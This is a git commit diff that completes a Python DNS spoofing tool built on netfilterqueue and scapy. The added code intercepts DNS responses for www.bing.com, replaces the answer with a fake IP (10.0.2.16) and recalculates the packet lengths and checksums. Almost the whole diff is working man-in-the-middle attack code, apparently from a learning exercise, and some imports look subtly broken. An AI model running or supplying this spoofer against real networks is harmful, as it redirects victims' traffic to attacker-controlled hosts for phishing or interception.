68193aba550b798dea091c926e4ff350be6ccec1
chris <chrispitillo@gmail.com>
2023-06-26 15:13:41 +0100

    finalized DNS spoofer and converted for usage in python3

--- dns_spoofer/dns_spoofer.py
+++ dns_spoofer/dns_spoofer.py
@@ -1,10 +1,9 @@
-#!/usr/bin/env python
 import netfilterqueue
 import pyptables
 import scapy
 
 def main():
-    setup_iptables()
+    #setup_iptables()
 
     try:
         queue = netfilterqueue.NetfilterQueue()
@@ -33,13 +32,25 @@ def flush_iptables():
 
 
 def process_packet(packet):
-    #TODO argparse for the website to spoof?
+    #TODO argparse for the website to spoof and fake IP to return
+    website = 'www.bing.com'
+    fake_IP = '10.0.2.16'
     scapy_packet = scapy.IP(packet.get_payload())
-    if scapy_packet.haslayer(scapy.DNSRR)
-        qname = scapy_packet[scapy.DNSQR].qname()
-        if "www.bing.com" in qname:
-            print('[+] Found website DNS request. Spoofing...']
-            answer = scapy.DNSRR(rrname=qname)
+    if scapy_packet.haslayer(scapy.DNSRR):
+        qname = scapy_packet[scapy.DNSQR].qname
+        if website in qname.decode():  # Decode bytes to string for comparison in Python 3
+            print(f'[+] Found {website} in DNS request. Spoofing...')
+            answer = scapy.DNSRR(rrname=qname, rdata=fake_IP)
+            scapy_packet[scapy.DNS].an = answer
+            scapy_packet[scapy.DNS].ancount = 1
+            # Removes the len and chksum args from packet and scapy will recalculate based on our ans before sending
+                # Ensures no corruption errors when sending.
+            del scapy_packet[scapy.IP].len
+            del scapy_packet[scapy.IP].chksum
+            del scapy_packet[scapy.UDP].len
+            del scapy_packet[scapy.UDP].chksum
+
+            packet.set_payload(bytes(scapy_packet))  # Convert scapy packet to bytes for Python 3
 
     packet.accept()
 
